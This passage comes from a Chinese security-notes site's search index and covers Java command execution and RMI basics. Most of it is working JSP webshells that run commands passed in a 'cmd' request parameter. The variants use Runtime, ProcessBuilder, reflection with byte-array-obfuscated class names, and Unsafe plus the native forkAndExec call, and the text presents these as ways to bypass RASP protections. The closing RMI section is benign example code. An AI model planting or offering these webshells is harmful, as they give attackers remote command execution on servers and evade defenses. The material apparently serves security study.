forkMethod.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false }); // \u521d\u59cb\u5316\u547d\u4ee4\u6267\u884c\u7ed3\u679c\uff0c\u5c06\u672c\u5730\u547d\u4ee4\u6267\u884c\u7684\u8f93\u51fa\u6d41\u8f6c\u6362\u4e3a\u7a0b\u5e8f\u6267\u884c\u7ed3\u679c\u7684\u8f93\u51fa\u6d41 Method initStreamsMethod = processClass.getDeclaredMethod(\"initStreams\", int[].class); initStreamsMethod.setAccessible(true); initStreamsMethod.invoke(processObject, std_fds); // \u83b7\u53d6\u672c\u5730\u6267\u884c\u7ed3\u679c\u7684\u8f93\u5165\u6d41 Method getInputStreamMethod = processClass.getMethod(\"getInputStream\"); getInputStreamMethod.setAccessible(true); InputStream in = (InputStream) getInputStreamMethod.invoke(processObject); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int a = 0; byte[] b = new byte[1024]; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.println(\"<pre>\"); out.println(baos.toString()); out.println(\"</pre>\"); out.flush(); out.close(); } %>","title":"java\u672c\u5730\u547d\u4ee4\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#java\u547d\u4ee4\u6267\u884c","text":"","title":"java\u547d\u4ee4\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#runtime\u547d\u4ee4\u6267\u884c","text":"Runtime.exec \u6267\u884c\u903b\u8f91 1. Runtime.exec(xxx) 2. java.lang.ProcessBuilder.start() 3. new java.lang.UNIXProcess(xxx) 4. UNIXProcess \u6784\u9020\u65b9\u6cd5\u4e2d\u8c03\u7528\u4e86 forkAndExec(xxx) native\u65b9\u6cd5\u3002 5. forkAndExec \u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b fork -> exec (*nix)/ CreateProcess (Windows)\u6267\u884c\u547d\u4ee4\u5e76\u8fd4\u56de fork / CreateProcess \u7684 PID // \u4e00\u53e5\u8bdd\u547d\u4ee4\u6267\u884cjsp\u6728\u9a6c(\u65e0\u56de\u663e) <%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%> // \u547d\u4ee4\u6267\u884cjsp\u6728\u9a6c(\u6709\u56de\u663e) ?cmd=\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <% String cmd = request.getParameter(\"cmd\"); if (cmd != null) { // InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); InputStream in = new ProcessBuilder(cmd).start().getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.write(\"<pre>\" + new String(baos.toByteArray()) + \"</pre>\"); } %> // \u53cd\u5c04Runtime\u547d\u4ee4\u6267\u884c <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Scanner\" %> <% String str = request.getParameter(\"str\"); // \u5b9a\u4e49\"java.lang.Runtime\"\u5b57\u7b26\u4e32\u53d8\u91cf String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}); // \u53cd\u5c04java.lang.Runtime\u7c7b\u83b7\u53d6Class\u5bf9\u8c61 Class<?> c = Class.forName(rt); // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b\u7684getRuntime\u65b9\u6cd5 Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})); // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b\u7684exec\u65b9\u6cd5 Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class); // \u53cd\u5c04\u8c03\u7528Runtime.getRuntime().exec(xxx)\u65b9\u6cd5 Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str}); // \u53cd\u5c04\u83b7\u53d6Process\u7c7b\u7684getInputStream\u65b9\u6cd5 Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109})); m.setAccessible(true); // \u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u8f93\u5165\u6d41\u5bf9\u8c61\uff1ap.getInputStream()\u5e76\u4f7f\u7528Scanner\u6309\u884c\u5207\u5272\u6210\u5b57\u7b26\u4e32 Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter(\"\\\\A\"); String result = s.hasNext() ? s.next() : \"\"; // \u8f93\u51fa\u547d\u4ee4\u6267\u884c\u7ed3\u679c out.println(result); %>","title":"Runtime\u547d\u4ee4\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#processbuilder\u547d\u4ee4\u6267\u884c","text":"Runtime.exec \u6700\u7ec8\u4f1a\u8c03\u7528 ProcessBuilder \u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 ProcessBuilder \u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u4f7f\u7528 ProcessBuilder \u53ef\u4ee5\u5b9e\u73b0\u6267\u884c\u6bd4\u8f83\u590d\u6742\u7684\u7cfb\u7edf\u547d\u4ee4 // windows\u4e0b\u53ef\u4ee5\u5c1d\u8bd5\u6267\u884c cmd=cmd.exe&cmd=/c&cmd=whoami // linux\u4e0b\u53ef\u4ee5\u5c1d\u8bd5\u6267\u884c cmd=/bin/sh&cmd=-c&cmd=cd%20/Users/;ls%20-la <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <% InputStream in = new ProcessBuilder(request.getParameterValues(\"cmd\")).start().getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while((a=in.read(b)) != -1) { baos.write(b,0,a); } out.write(\"<p>\" + new String(baos.toByteArray()) + \"</p>\"); %>","title":"ProcessBuilder\u547d\u4ee4\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#\u53cd\u5c04unixprocessprocessimpl\u547d\u4ee4\u6267\u884c","text":"UNIXProcess \u548c ProcessImpl \u53ef\u4ee5\u7406\u89e3\u672c\u5c31\u662f\u4e00\u4e2a\u4e1c\u897f,\u5728JDK9\u7684\u65f6\u5019\u628a UNIXProcess \u5408\u5e76\u5230\u4e86 ProcessImpl UNIXProcess \u548c ProcessImpl \u5176\u5b9e\u5c31\u662f\u6700\u7ec8\u8c03\u7528 native \u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb forkAndExec \u7684 native \u65b9\u6cd5\uff0c\u5982\u65b9\u6cd5\u540d\u6240\u8ff0\u4e3b\u8981\u662f\u901a\u8fc7 fork&exec \u6765\u6267\u884c\u672c\u5730\u7cfb\u7edf\u547d\u4ee4 \u5229\u7528\u8fd9\u4e2a\u66f4\u52a0\u5e95\u5c42\u7684 UNIXProcess/ProcessImpl \u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u53ef\u4ee5\u5c1d\u8bd5\u7ed5\u8fc7RASP // \u53cd\u5c04UNIXProcess/ProcessImpl\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 // windows\u4e0b\u53cd\u5c04ProcessImpl \u8c03\u7528start\u65b9\u6cd5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,start\u65b9\u6cd5\u5b9e\u8d28\u662f\u521b\u5efa\u4e86\u4e00\u4e2aProcessImpl\u7684\u5b9e\u4f8b <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <% String[] cmd = request.getParameterValues(\"cmd\"); if (cmd != null) { Class<?> clazz = Class.forName(\"java.lang.ProcessImpl\"); Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); Process p = (Process) method.invoke(null, cmd, null, \".\", null, true); InputStream in = p.getInputStream(); byte[] b = new byte[1024]; int a = -1; ByteArrayOutputStream baos = new ByteArrayOutputStream(); while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.write(\"<p>\" + baos.toString() + \"</p>\"); } %> // windows\u4e0b\u53cd\u5c04ProcessImpl\u65b0\u5efa\u5b9e\u4f8b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <% String[] cmd = request.getParameterValues(\"cmd\"); if (cmd != null) { Class<?> clazz = Class.forName(\"java.lang.ProcessImpl\"); Constructor<?> constructor = clazz.getDeclaredConstructors()[0]; constructor.setAccessible(true); Object object = constructor.newInstance(cmd, null, \".\", new long[]{0}, true); } %> // \u7c7bunix\u4e0b\u53cd\u5c04UNIXProcess/ProcessImpl\u6784\u9020\u5b9e\u4f8b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.*\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%! byte[] toCString(String s) { if (s == null) { return null; } byte[] bytes = s.getBytes(); byte[] result = new byte[bytes.length + 1]; System.arraycopy(bytes, 0, result, 0, bytes.length); result[result.length - 1] = (byte) 0; return result; } InputStream start(String[] strs) throws Exception { // java.lang.UNIXProcess String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115}); // java.lang.ProcessImpl String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108}); Class clazz = null; // \u53cd\u5c04\u521b\u5efaUNIXProcess\u6216\u8005ProcessImpl try { clazz = Class.forName(unixClass); } catch (ClassNotFoundException e) { clazz = Class.forName(processClass); } // \u83b7\u53d6UNIXProcess\u6216\u8005ProcessImpl\u7684\u6784\u9020\u65b9\u6cd5 Constructor<?> constructor = clazz.getDeclaredConstructors()[0]; constructor.setAccessible(true); assert strs != null && strs.length > 0; // Convert arguments to a contiguous block; it's easier to do // memory management in Java than in C. byte[][] args = new byte[strs.length - 1][]; int size = args.length; // For added NUL bytes for (int i = 0; i < args.length; i++) { args[i] = strs[i + 1].getBytes(); size += args[i].length; } byte[] argBlock = new byte[size]; int i = 0; for (byte[] arg : args) { System.arraycopy(arg, 0, argBlock, i, arg.length); i += arg.length + 1; // No need to write NUL bytes explicitly } int[] envc = new int[1]; int[] std_fds = new int[]{-1, -1, -1}; FileInputStream f0 = null; FileOutputStream f1 = null; FileOutputStream f2 = null; // In theory, close() can throw IOException // (although it is rather unlikely to happen here) try { if (f0 != null) f0.close(); } finally { try { if (f1 != null) f1.close(); } finally { if (f2 != null) f2.close(); } } // \u521b\u5efaUNIXProcess\u6216\u8005ProcessImpl\u5b9e\u4f8b Object object = constructor.newInstance( toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false ); // \u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7684InputStream Method inMethod = object.getClass().getDeclaredMethod(\"getInputStream\"); inMethod.setAccessible(true); return (InputStream) inMethod.invoke(object); } String inputStreamToString(InputStream in, String charset) throws IOException { try { if (charset == null) { charset = \"UTF-8\"; } ByteArrayOutputStream out = new ByteArrayOutputStream(); int a = 0; byte[] b = new byte[1024]; while ((a = in.read(b)) != -1) { out.write(b, 0, a); } return new String(out.toByteArray()); } catch (IOException e) { throw e; } finally { if (in != null) in.close(); } } %> <% String[] str = request.getParameterValues(\"cmd\"); if (str != null) { InputStream in = start(str); String result = inputStreamToString(in, \"UTF-8\"); out.println(\"<pre>\"); out.println(result); out.println(\"</pre>\"); out.flush(); out.close(); } %>","title":"\u53cd\u5c04UNIXProcess/ProcessImpl\u547d\u4ee4\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#forkandexec\u547d\u4ee4\u6267\u884c-unsafe\u53cd\u5c04native\u65b9\u6cd5\u8c03\u7528","text":"\u5982\u679c RASP \u628a UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u62e6\u622a,\u53ef\u4ee5\u901a\u8fc7 Unsafe.allocateInstance \u6765\u8fdb\u884c\u7ed5\u8fc7,\u5177\u4f53\u6b65\u9aa4\u662f 1. \u4f7f\u7528 sun.misc.Unsafe.allocateInstance(Class) \u7279\u6027\u53ef\u4ee5\u65e0\u9700 new \u6216\u8005 newInstance \u521b\u5efa UNIXProcess/ProcessImpl \u7c7b\u5bf9\u8c61 2. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 forkAndExec \u65b9\u6cd5 3. \u6784\u9020 forkAndExec \u9700\u8981\u7684\u53c2\u6570\u5e76\u8c03\u7528 4. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 initStreams \u65b9\u6cd5\u521d\u59cb\u5316\u8f93\u5165\u8f93\u51fa\u7ed3\u679c\u6d41\u5bf9\u8c61 5. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 getInputStream \u65b9\u6cd5\u83b7\u53d6\u672c\u5730\u547d\u4ee4\u6267\u884c\u7ed3\u679c(\u5982\u679c\u8981\u8f93\u51fa\u6d41\u3001\u5f02\u5e38\u6d41\u53cd\u5c04\u5bf9\u5e94\u65b9\u6cd5\u5373\u53ef) // \u7c7bUnix\u4e0b <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"sun.misc.Unsafe\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%! byte[] toCString(String s) { if (s == null) return null; byte[] bytes = s.getBytes(); byte[] result = new byte[bytes.length + 1]; System.arraycopy(bytes, 0, result, 0, bytes.length); result[result.length - 1] = (byte) 0; return result; } %> <% String[] strs = request.getParameterValues(\"cmd\"); if (strs != null) { Field theUnsafeField = Unsafe.class.getDeclaredField(\"theUnsafe\"); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); Class processClass = null; try { processClass = Class.forName(\"java.lang.UNIXProcess\"); } catch (ClassNotFoundException e) { processClass = Class.forName(\"java.lang.ProcessImpl\"); } Object processObject = unsafe.allocateInstance(processClass); // Convert arguments to a contiguous block; it's easier to do // memory management in Java than in C. byte[][] args = new byte[strs.length - 1][]; int size = args.length; // For added NUL bytes for (int i = 0; i < args.length; i++) { args[i] = strs[i + 1].getBytes(); size += args[i].length; } byte[] argBlock = new byte[size]; int i = 0; for (byte[] arg : args) { System.arraycopy(arg, 0, argBlock, i, arg.length); i += arg.length + 1; // No need to write NUL bytes explicitly } int[] envc = new int[1]; int[] std_fds = new int[]{-1, -1, -1}; Field launchMechanismField = processClass.getDeclaredField(\"launchMechanism\"); Field helperpathField = processClass.getDeclaredField(\"helperpath\"); launchMechanismField.setAccessible(true); helperpathField.setAccessible(true); Object launchMechanismObject = launchMechanismField.get(processObject); byte[] helperpathObject = (byte[]) helperpathField.get(processObject); int ordinal = (int) launchMechanismObject.getClass().getMethod(\"ordinal\").invoke(launchMechanismObject); Method forkMethod = processClass.getDeclaredMethod(\"forkAndExec\", new Class[]{ int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class }); forkMethod.setAccessible(true);// \u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650 int pid = (int) forkMethod.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false }); // \u521d\u59cb\u5316\u547d\u4ee4\u6267\u884c\u7ed3\u679c\uff0c\u5c06\u672c\u5730\u547d\u4ee4\u6267\u884c\u7684\u8f93\u51fa\u6d41\u8f6c\u6362\u4e3a\u7a0b\u5e8f\u6267\u884c\u7ed3\u679c\u7684\u8f93\u51fa\u6d41 Method initStreamsMethod = processClass.getDeclaredMethod(\"initStreams\", int[].class); initStreamsMethod.setAccessible(true); initStreamsMethod.invoke(processObject, std_fds); // \u83b7\u53d6\u672c\u5730\u6267\u884c\u7ed3\u679c\u7684\u8f93\u5165\u6d41 Method getInputStreamMethod = processClass.getMethod(\"getInputStream\"); getInputStreamMethod.setAccessible(true); InputStream in = (InputStream) getInputStreamMethod.invoke(processObject); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int a = 0; byte[] b = new byte[1024]; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.println(\"<pre>\"); out.println(baos.toString()); out.println(\"</pre>\"); out.flush(); out.close(); } %>","title":"forkAndExec\u547d\u4ee4\u6267\u884c-Unsafe+\u53cd\u5c04+Native\u65b9\u6cd5\u8c03\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/","text":"\u5f00\u5934\u58f0\u660e # \u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfb \u653b\u51fbJava Web\u5e94\u7528-[Java Web\u5b89\u5168] \u540e\u7684\u793a\u4f8b\u590d\u73b0\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/#\u5f00\u5934\u58f0\u660e","text":"\u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfb \u653b\u51fbJava Web\u5e94\u7528-[Java Web\u5b89\u5168] \u540e\u7684\u793a\u4f8b\u590d\u73b0\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%871/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"RMI\u7bc71 # RMI\u5168\u79f0\u662fRemote Method Invocation\uff0c\u8fdc\u7a0b\u2f45\u65b9\u6cd5\u8c03\u7528\u3002\u4ece\u8fd9\u4e2a\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\uff0c\u4ed6\u7684\u76ee\u6807\u548cRPC\u5176\u5b9e\u662f\u7c7b\u4f3c\u7684\uff0c\u662f\u8ba9\u67d0\u4e2aJava\u865a\u62df\u673a\u4e0a\u7684\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2aJava\u865a\u62df\u673a\u4e2d\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\uff0c\u53ea\u4e0d\u8fc7RMI\u662fJava\u72ec\u6709\u7684\u4e00\u79cd\u673a\u5236\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b \u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5\u9700\u8981 - \u4e00\u4e2a\u7ee7\u627f\u4e86java.rmi.Remote\u7684\u63a5\u53e3 - \u4e00\u4e2a\u5b9e\u73b0\u4e86\u8be5\u63a5\u53e3\u5e76\u7ee7\u627f\u4e86UnicastRemoteObject\u7684\u7c7b package top.longlone ; import java.rmi.Remote ; import java.rmi.RemoteException ; public interface IRemoteHelloWorld extends Remote { public String hello () throws RemoteException ; } package top.longlone ; import java.rmi.RemoteException ; import java.rmi.server.UnicastRemoteObject ; public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld () throws RemoteException { super (); } @Override public String hello () throws RemoteException { System . out . println ( \"call\" ); return \"hello world\" ; } } RMIServer\u9700\u8981\u521b\u5efaRegistry\uff0c\u5e76\u5c06\u4e0a\u9762\u7684\u7c7b\u5b9e\u4f8b\u5316\u540e\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5730\u5740\u3002 package top.longlone ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { RemoteHelloWorld helloWorld = new RemoteHelloWorld (); LocateRegistry . createRegistry ( 1099 ); Naming . bind ( \"rmi://192.168.135.142:1099/Hello\" , helloWorld ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } RMIClient\u4f7f\u7528 Naming.lookup \u5728Registry\u4e2d\u627e\u5230HelloWorld\u7684\u5bf9\u8c61\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\u63a5\u53e3\u7684\u91cd\u8981\u6027: \u867d\u7136\u6211\u4eec\u662f\u5728\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u5b9e\u4f8b\u77e5\u9053\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u56e0\u6b64\u5ba2\u6237\u7aef\u4e5f\u9700\u8981\u8fd9\u4e2a\u63a5\u53e3\u3002 package top.longlone ; import java.rmi.Naming ; public class RMIClient { public static void main ( String [] args ) throws Exception { IRemoteHelloWorld helloWorld = ( IRemoteHelloWorld ) Naming . lookup ( \"rmi://192.168.135.142:1099/Hello\" ); String ret = helloWorld . hello (); System . out . println ( ret ); } } \u7ed3\u5408\u6587\u7ae0\u6240\u8bf4\u7684\uff0c\u6574\u4e2aRMI\u7684\u6d41\u7a0b\u5982\u4e0b: \u9996\u5148\u5ba2\u6237\u7aef\u8fde\u63a5Registry\uff0c\u5e76\u5728\u5176\u4e2d\u5bfb\u627eName\u662fHello\u7684\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u5e94\u6570\u636e\u6d41\u4e2d\u7684Call\u6d88\u606f\uff1b\u7136\u540eRegistry\u8fd4\u56de\u4e00\u4e2a\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u8fd9\u4e2a\u5c31\u662f\u627e\u5230\u7684Name=Hello\u7684\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u5e94\u6570\u636e\u6d41\u4e2d\u7684ReturnData\u6d88\u606f\uff1b\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u8be5\u5bf9\u8c61\uff0c\u53d1\u73b0\u8be5\u5bf9\u8c61\u662f\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5730\u5740\u5728192.168.135.142:33769\uff0c\u4e8e\u662f\u518d\u4e0e\u8fd9\u4e2a\u5730\u5740\u5efa\u7acbTCP\u8fde\u63a5\u3002\u5728\u8fd9\u4e2a\u65b0\u7684\u8fde\u63a5\u4e2d\uff0c\u624d\u6267\u884c\u771f\u6b63\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff0c\u4e5f\u5c31\u662fhello()\u3002 RMI Registry\u5c31\u50cf\u4e00\u4e2a\u7f51\u5173\uff0c\u4ed6\u81ea\u5df1\u662f\u4e0d\u4f1a\u6267\u884c\u8fdc\u7a0b\u65b9\u6cd5\u7684\uff0c\u4f46RMI Server\u53ef\u4ee5\u5728\u4e0a\u9762\u6ce8\u518c\u4e00\u4e2aName\u5230\u5bf9\u8c61\u7684\u7ed1\u5b9a\u5173\u7cfb\uff1bRMI Client\u901a\u8fc7Name\u5411RMI Registry\u67e5\u8be2\uff0c\u5f97\u5230\u8fd9\u4e2a\u7ed1\u5b9a\u5173\u7cfb\uff0c\u7136\u540e\u518d\u8fde\u63a5RMI Server\uff1b\u6700\u540e\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u5b9e\u9645\u4e0a\u5728RMI Server\u4e0a\u8c03\u7528\u3002","title":"RMI\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%871/#rmi\u7bc71","text":"RMI\u5168\u79f0\u662fRemote Method Invocation\uff0c\u8fdc\u7a0b\u2f45\u65b9\u6cd5\u8c03\u7528\u3002\u4ece\u8fd9\u4e2a\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\uff0c\u4ed6\u7684\u76ee\u6807\u548cRPC\u5176\u5b9e\u662f\u7c7b\u4f3c\u7684\uff0c\u662f\u8ba9\u67d0\u4e2aJava\u865a\u62df\u673a\u4e0a\u7684\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2aJava\u865a\u62df\u673a\u4e2d\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\uff0c\u53ea\u4e0d\u8fc7RMI\u662fJava\u72ec\u6709\u7684\u4e00\u79cd\u673a\u5236\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b \u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5\u9700\u8981 - \u4e00\u4e2a\u7ee7\u627f\u4e86java.rmi.Remote\u7684\u63a5\u53e3 - \u4e00\u4e2a\u5b9e\u73b0\u4e86\u8be5\u63a5\u53e3\u5e76\u7ee7\u627f\u4e86UnicastRemoteObject\u7684\u7c7b package top.longlone ; import java.rmi.Remote ; import java.rmi.RemoteException ; public interface IRemoteHelloWorld extends Remote { public String hello () throws RemoteException ; } package top.longlone ; import java.rmi.RemoteException ; import java.rmi.server.UnicastRemoteObject ; public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld () throws RemoteException { super (); } @Override public String hello () throws RemoteException { System . out . println ( \"call\" ); return \"hello world\" ; } } RMIServer\u9700\u8981\u521b\u5efaRegistry\uff0c\u5e76\u5c06\u4e0a\u9762\u7684\u7c7b\u5b9e\u4f8b\u5316\u540e\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5730\u5740\u3002 package top.longlone ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { RemoteHelloWorld helloWorld = new RemoteHelloWorld (); LocateRegistry . createRegistry ( 1099 ); Naming . bind ( \"rmi://192.168.135.142:1099/Hello\" , helloWorld ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } RMIClient\u4f7f\u7528 Naming.lookup \u5728Registry\u4e2d\u627e\u5230HelloWorld\u7684\u5bf9\u8c61\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\u63a5\u53e3\u7684\u91cd\u8981\u6027: \u867d\u7136\u6211\u4eec\u662f\u5728\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u5b9e\u4f8b\u77e5\u9053\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u56e0\u6b64\u5ba2\u6237\u7aef\u4e5f\u9700\u8981\u8fd9\u4e2a\u63a5\u53e3\u3002 package top.longlone ; import java.rmi.Naming ; public class RMIClient { public static void main ( String [] args ) throws Exception { IRemoteHelloWorld helloWorld = ( IRemoteHelloWorld ) Naming . lookup ( \"rmi://192.168.135.142:1099/Hello\" ); String ret = helloWorld . hello (); System . out . println ( ret ); } } \u7ed3\u5408\u6587\u7ae0\u6240\u8bf4\u7684\uff0c\u6574\u4e2aRMI\u7684\u6d41\u7a0b\u5982\u4e0b: 